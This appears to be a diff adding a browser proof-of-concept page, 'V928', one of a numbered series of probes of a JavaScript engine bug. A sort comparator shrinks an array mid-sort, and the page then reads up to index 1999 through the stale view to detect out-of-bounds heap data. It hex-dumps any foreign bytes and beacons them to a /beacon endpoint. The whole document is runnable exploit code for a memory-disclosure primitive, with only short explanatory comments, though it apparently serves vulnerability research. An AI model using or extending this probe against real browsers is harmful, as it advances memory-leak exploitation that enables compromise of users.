@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V928</title></head>
+<body><pre id="out">V928 — sort-shrink stale view, DEEP READ: does the window extend beyond the old allocation?</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V928-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v928 — v927 pattern C fired: after the sort comparator shrank the array
+ * to length 3 mid-sort, arr[100] still returned the original fill (100.5).
+ * Length/butterfly desync, REAL — but the read was inside the buffer's
+ * retained capacity (256 slots), so memory-safety is unproven
+ * (p695-C capacity-vs-length lesson).
+ *
+ * THIS probe answers the only question that separates "semantic desync"
+ * from "OOB read": does the stale view extend BEYOND the old allocation?
+ *
+ * Construction (both arrays in one load; the control validates the
+ * harness, the shrink array is the experiment):
+ *   ctl    = 256 doubles (i+0.5), NO shrink — deep read must be all
+ *            undefined beyond 256 (proves normal reads stop at capacity)
+ *   shrink = 256 doubles, sort comparator shrinks to 3 mid-sort (v927-C
+ *            verbatim) — then deep read 0..1999:
+ *     in-capacity (0..255): retained fill = the known desync (control)
+ *     beyond capacity (256..1999): any NON-undefined value = foreign
+ *         heap bytes through the stale view = THE LEAK WINDOW
+ *     a context death mid-read = the window is bounded by the last
+ *         beaconed chunk (position-proof via sync beacons per chunk)
+ *
+ * Readout: chunked (100 indices per chunk), each chunk beaconed SYNC
+ * after reading: undefined-count, number-count, object-count, and the
+ * first non-fill values byte-exact (DAZ law: Float64Array->Uint8Array,
+ * no arithmetic). Fill pattern: value === i+0.5 is ours; anything else
+ * is foreign-or-weird. ?w= overrides the base size; ?r=1 resets.
+ */
+
+var QS=location.search;
+var BASE=parseInt((QS.match(/[?&]w=(\d+)/)||[])[1]||'256',10);
+var DEEP=2000, CHUNK=100;
+
+function hexv(v){
+  try{
+    var b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint8Array(b);
+    f[0]=v; var s='0x';
+    for(var k=7;k>=0;k--) s+=('0'+u[k].toString(16)).slice(-2);
+    return s;
+  }catch(e){ return 'hex-err'; }
+}
+function readChunk(arr, start, end){
+  var undef=0, nums=0, objs=0, foreign=[], i;
+  for(var i2=start; i2<end; i2++){
+    var v;
+    try{ v=arr[i2]; }catch(e){ v='<throw>'; }
+    if(v===undefined){ undef++; continue; }
+    if(typeof v==='number' && isFinite(v)){
+      nums++;
+      if(Math.abs(v-(i2+0.5))>1e-9) foreign.push(i2+':'+hexv(v));
+    } else if(typeof v==='object'&&v!==null){
+      objs++; foreign.push(i2+':OBJ');
+    } else {
+      foreign.push(i2+':'+String(v).slice(0,20));
+    }
+  }
+  return {undef:undef,nums:nums,objs:objs,foreign:foreign,start:start,end:end};
+}
+function beaconChunk(tag,r){
+  var f=r.foreign.slice(0,10).join(', ');
+  bk(tag,'['+r.start+'..'+r.end+') undef='+r.undef+' num='+r.nums+' obj='+r.objs+(f?('| FOREIGN: '+f):''));
+}
+
+bk('BOOT','base='+BASE+' deep='+DEEP+' chunk='+CHUNK);
+
+/* ---- control array: NO shrink ---- */
+var ctl=[]; for(var i=0;i<BASE;i++) ctl.push(i+0.5);
+
+/* ---- shrink array: v927-C verbatim ---- */
+var shr=[]; for(var j=0;j<BASE;j++) shr.push(j+0.5);
+var runs=0;
+shr.sort(function(a,b){ runs++; if(runs===50){ shr.length=3; shr[0]={}; } return a-b; });
+bk('POSTSORT','ctl.len='+ctl.length+' shr.len='+shr.length+' shr[0]='+String(shr[0]).slice(0,20)+' shr[100]='+String(shr[100]).slice(0,20));
+
+/* ---- deep read, chunked, sync-beaconed (position-proof) ---- */
+var idx=0;
+function pass(arr,tag){
+  while(idx<DEEP){
+    var end=Math.min(idx+CHUNK,DEEP);
+    var r=readChunk(arr,idx,end);
+    beaconChunk(tag+'-C'+idx,r);
+    idx=end;
+  }
+}
+pass(ctl,'CTL');          /* control: everything beyond BASE must be undefined */
+idx=0;
+pass(shr,'SHR');          /* the experiment */
+
+/* summary */
+var sum='';
+bk('DONE','deep read complete ctl+shr to '+DEEP+' — FOREIGN rows beyond base='+BASE+' are the leak-window candidates');
+</script></body></html>
